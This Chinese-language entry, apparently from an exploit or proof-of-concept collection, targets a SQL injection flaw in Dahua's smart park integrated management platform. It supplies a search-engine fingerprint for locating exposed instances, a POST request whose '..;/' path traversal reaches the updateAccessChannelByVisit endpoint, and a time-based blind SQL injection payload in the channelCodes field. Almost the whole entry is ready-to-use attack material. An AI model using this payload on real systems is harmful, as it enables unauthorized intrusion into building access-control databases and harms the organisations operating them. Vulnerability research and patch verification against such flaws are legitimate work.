# 大华-智慧园区综合管理平台updateAccessChannelByVisit存在SQL注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /CardSolution/card/visitor/appointment/..;/..;/..;/card/accessControl/channel/updateAccessChannelByVisit HTTP/1.1`

**Payload**
```
{"channelCodes":["1') OR (SELECT 8608 FROM (SELECT(SLEEP(5)))PemD) AND ('RyYI'='RyYI"]}
```
- **响应特征**：200